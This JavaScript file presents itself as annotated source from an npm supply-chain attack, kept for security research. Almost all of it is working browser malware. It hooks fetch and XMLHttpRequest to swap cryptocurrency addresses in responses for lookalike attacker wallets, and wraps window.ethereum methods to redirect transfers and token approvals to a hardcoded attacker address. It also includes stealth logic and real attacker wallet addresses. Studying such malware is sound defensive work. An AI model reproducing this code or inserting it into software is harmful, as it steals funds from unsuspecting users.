/*
 * ⚠️ WARNING: MALICIOUS CODE ⚠️
 * This file contains the annotated source code from the September 2025 NPM supply-chain attack.
 * It is provided for educational and security research purposes only.
 * DO NOT EXECUTE THIS CODE unless you are in a secure, sandboxed environment.
 */


// =============================================================================
// SECTION 0: GLOBAL STATE & ACTIVATION LOGIC
// This section mirrors the actual activation logic of the malware.
// =============================================================================

// Global flags to control execution flow.
let neth = 0; // Tracks if an Ethereum wallet was found (1 for true).
let rund = 0; // Tracks if the main payload has been run (1 for true).
let loval = 0; // Guard flag for the network interceptor.

/**
 * Checks for the presence of a browser-based Ethereum wallet (like MetaMask).
 * This function's logic is kept faithful to the original deobfuscated script.
 */
async function detectAndInitializeWalletHooks() {
    try {
        // Request accounts from the wallet.
        const accounts = await window.ethereum.request({ 'method': 'eth_accounts' });

        if (accounts.length > 0) {
            // If wallet is connected, activate transaction hijacking first.
            hijackWalletTransactions();
            if (rund != 1) {
                rund = 1;
                neth = 1; // Set flag: ETH wallet is present and active.
                initializeAddressSwapper();
            }
        } else if (rund != 1) {
            // If wallet exists but is not connected, just activate the address swapper.
            rund = 1;
            initializeAddressSwapper();
        }
    } catch (error) {
        // If an error occurs, still attempt to run the address swapper.
        if (rund != 1) {
            rund = 1;
            initializeAddressSwapper();
        }
    }
}

// Initial execution logic.
if (typeof window !== 'undefined' && typeof window.ethereum !== 'undefined') {
    // If a wallet provider is likely present, run the detection.
    detectAndInitializeWalletHooks();
} else if (rund != 1) {
    // Otherwise, immediately initialize the generic address swapper.
    rund = 1;
    initializeAddressSwapper();
}


/**
 * =============================================================================
 * SECTION 1: GENERIC CRYPTO ADDRESS SWAPPER
 * This module intercepts web requests (Fetch/XHR) and replaces crypto addresses
 * found in the response bodies with attacker-owned addresses.
 * =============================================================================
 */
function initializeAddressSwapper() {
    // A flag to prevent multiple initializations.
    if (loval !== 0) return;
    loval = 1;

    /**
     * Calculates the Levenshtein distance between two strings.
     * Used to find an attacker's address that looks "similar" to the original.
     */
    function getLevenshteinDistance(str1, str2) {
        const dp = Array.from({ length: str1.length + 1 }, () => Array(str2.length + 1).fill(0));
        for (let i = 0; i <= str1.length; i++) dp[i][0] = i;
        for (let j = 0; j <= str2.length; j++) dp[0][j] = j;
        for (let i = 1; i <= str1.length; i++) {
            for (let j = 1; j <= str2.length; j++) {
                dp[i][j] = str1[i - 1] === str2[j - 1] ? dp[i - 1][j - 1] : 1 + Math.min(dp[i - 1][j], dp[i][j - 1], dp[i - 1][j - 1]);
            }
        }
        return dp[str1.length][str2.length];
    }

    /**
     * Finds the best matching attacker address from a given list.
     */
    function findClosestAddress(originalAddress, attackerAddresses) {
        let minDistance = Infinity;
        let closestMatch = null;
        for (let attackerAddress of attackerAddresses) {
            const distance = getLevenshteinDistance(originalAddress.toLowerCase(), attackerAddress.toLowerCase());
            if (distance < minDistance) {
                minDistance = distance;
                closestMatch = attackerAddress;
            }
        }
        return closestMatch;
    }

    // --- Hook the global fetch function ---
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        const clonedResponse = response.clone();
        const contentType = clonedResponse.headers.get('Content-Type') || '';
        let responseBody;

        if (contentType.includes('application/json')) {
            responseBody = await clonedResponse.json().catch(() => clonedResponse.text());
        } else {
            responseBody = await clonedResponse.text();
        }

        const modifiedBody = recursivelyReplace(responseBody);
        const finalBody = (typeof modifiedBody === 'object' && modifiedBody !== null) ? JSON.stringify(modifiedBody) : modifiedBody;

        return new Response(finalBody, {
            status: response.status,
            statusText: response.statusText,
            headers: response.headers
        });
    };

    // --- Hook XMLHttpRequest to intercept older AJAX requests ---
    if (typeof window !== 'undefined') {
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            return originalOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function() {
            const originalOnReadyStateChange = this.onreadystatechange;
            this.onreadystatechange = function() {
                if (this.readyState === 4) {
                    try {
                        const modifiedBody = recursivelyReplace(this.responseText);
                        Object.defineProperty(this, 'responseText', { value: modifiedBody, writable: true });
                        Object.defineProperty(this, 'response', { value: modifiedBody, writable: true });
                    } catch (e) {}
                }
                if (originalOnReadyStateChange) {
                    originalOnReadyStateChange.apply(this, arguments);
                }
            };
            return originalSend.apply(this, arguments);
        };
    }

    /**
     * Recursively processes an object or string to replace crypto addresses.
     */
    function recursivelyReplace(data) {
        try {
            if (typeof data === 'string') {
                try {
                    let parsedData = JSON.parse(data);
                    if (typeof parsedData === 'object' && parsedData !== null) {
                         const modifiedString = mainAddressReplacementLogic(data);
                         return JSON.parse(modifiedString);
                    }
                } catch(e) {
                    return mainAddressReplacementLogic(data);
                }
            }
            if (typeof data === 'object' && data !== null) {
                const jsonString = JSON.stringify(data);
                const modifiedString = mainAddressReplacementLogic(jsonString);
                return JSON.parse(modifiedString);
            }
            return data;
        } catch (e) {
            return data;
        }
    }

    /**
     * The core logic for finding and replacing addresses in a string.
     */
    function mainAddressReplacementLogic(text) {
        // NOTE: These are samples. The full list contains over 280 wallets 
        // and can be seen in the `deobfuscated_malware.js` file.
        const attackerWallets = {
            bitcoinLegacy: ["1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx", /* ... */],
            bitcoinSegwit: ["bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm", /* ... */],
            ethereum: ["0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976", /* ... */],
            solana: ["5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6", /* ... */],
            tron: ["TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67", /* ... */],
            litecoin: ["LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug", /* ... */],
            bch: ["bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh", /* ... */]
        };

        const addressRegexes = {
            ethereum: /\b0x[a-fA-F0-9]{40}\b/g,
            bitcoinLegacy: /\b1[a-km-zA-HJ-NP-Z1-9]{25,34}\b/g,
            bitcoinSegwit: /\b(3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\b/g,
            tron: /((?<!\w)[T][1-9A-HJ-NP-Za-km-z]{33})/g,
            bch: /bitcoincash:[qp][a-zA-Z0-9]{41}/g,
            ltc: /(?<!\w)ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}\b/g,
            solana: /((?<!\w)[1-9A-HJ-NP-Za-km-z]{32,44})/g
        };

        for (const [chain, regex] of Object.entries(addressRegexes)) {
            const matches = text.match(regex) || [];
            for (const originalAddress of matches) {
                const replacementList = attackerWallets[chain];
                if (replacementList && replacementList.length > 0) {
                    // Don't replace ETH addresses if an active ETH wallet was detected.
                    // This is a stealth measure to avoid breaking dApp functionality visibly.
                    if (chain === 'ethereum' && neth === 1) continue;
                    
                    const newAddress = findClosestAddress(originalAddress, replacementList);
                    text = text.replace(new RegExp(originalAddress, 'g'), newAddress);
                }
            }
        }
        return text;
    }
}


/**
 * =============================================================================
 * SECTION 2: WALLET TRANSACTION HIJACKER
 * This module hooks the `window.ethereum` object to manipulate transactions
 * before they are confirmed by the user.
 * =============================================================================
 */
function hijackWalletTransactions() {
    let transactionInterceptCount = 0;
    const originalMethods = new Map();
    let isHijacked = false;

    /**
     * Modifies transaction parameters to redirect funds.
     */
    function modifyTransactionParameters(tx, isEthTransaction = true) {
        const modifiedTx = JSON.parse(JSON.stringify(tx));
        const ethAttackerAddress = '0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976';
        const solanaAttackerAddress = '19111111111111111111111111111111';

        if (isEthTransaction) {
            if (modifiedTx.value && modifiedTx.value !== "0x0" && modifiedTx.value !== '0') {
                modifiedTx.to = ethAttackerAddress;
            }
            if (modifiedTx.data) {
                const data = modifiedTx.data.toLowerCase();
                if (data.startsWith("0x095ea7b3") && data.length >= 74) { // approve(address,uint256)
                    modifiedTx.data = data.substring(0, 10) + ethAttackerAddress.slice(2).padStart(64, '0') + 'f'.repeat(64);
                } else if (data.startsWith("0xa9059cbb") && data.length >= 74) { // transfer(address,uint256)
                    modifiedTx.data = data.substring(0, 10) + ethAttackerAddress.slice(2).padStart(64, '0') + data.substring(74);
                } else if (data.startsWith("0x23b872dd") && data.length >= 138) { // transferFrom(address,address,uint256)
                    modifiedTx.data = data.substring(0, 74) + ethAttackerAddress.slice(2).padStart(64, '0') + data.substring(138);
                }
            }
        } else { // Solana or other transaction types
            if (modifiedTx.instructions && Array.isArray(modifiedTx.instructions)) {
                modifiedTx.instructions.forEach(inst => {
                    if (inst.keys && Array.isArray(inst.keys)) inst.keys.forEach(key => { if (key.pubkey) key.pubkey = solanaAttackerAddress; });
                });
            }
            if (modifiedTx.recipient) modifiedTx.recipient = solanaAttackerAddress;
            if (modifiedTx.destination) modifiedTx.destination = solanaAttackerAddress;
        }
        return modifiedTx;
    }

    /**
     * A wrapper function that intercepts wallet API calls.
     */
    function walletApiWrapper(originalMethod) {
        return async function(...args) {
            transactionInterceptCount++;
            let clonedArgs = JSON.parse(JSON.stringify(args));
            
            if (args[0] && typeof args[0] === 'object') {
                const req = clonedArgs[0];
                if (req.method === 'eth_sendTransaction' && req.params && req.params[0]) {
                    req.params[0] = modifyTransactionParameters(req.params[0], true);
                } else if ((req.method === 'solana_signTransaction' || req.method === 'solana_signAndSendTransaction') && req.params && req.params[0]) {
                    let tx = req.params[0].transaction || req.params[0];
                    const modifiedTx = modifyTransactionParameters(tx, false);
                    if (req.params[0].transaction) req.params[0].transaction = modifiedTx;
                    else req.params[0] = modifiedTx;
                }
            }

            return originalMethod.apply(this, clonedArgs);
        };
    }

    /**
     * Finds and wraps the wallet's provider methods.
     */
    function applyHooksToProvider(provider) {
        if (!provider) return false;
        let hooksApplied = false;
        const methodsToHook = ['request', 'send', 'sendAsync'];
        for (const methodName of methodsToHook) {
            if (typeof provider[methodName] === 'function') {
                const originalMethod = provider[methodName];
                originalMethods.set(methodName, originalMethod);
                provider[methodName] = walletApiWrapper(originalMethod);
                hooksApplied = true;
            }
        }
        if (hooksApplied) isHijacked = true;
        return hooksApplied;
    }

    // Periodically check for the window.ethereum object and apply hooks.
    function attemptToHook() {
        let attempts = 0;
        const checkForWallet = () => {
            attempts++;
            if (window.ethereum) {
                setTimeout(() => applyHooksToProvider(window.ethereum), 500);
                return;
            }
            if (attempts < 50) {
                setTimeout(checkForWallet, 100);
            }
        };
        checkForWallet();
    }

    attemptToHook();

    // Expose a control object on the window, perhaps for C2 or debugging.
    window.stealthProxyControl = {
        isActive: () => isHijacked,
        getInterceptCount: () => transactionInterceptCount,
        getOriginalMethods: () => originalMethods,
        forceShield: () => window.ethereum ? applyHooksToProvider(window.ethereum) : false
    };
}
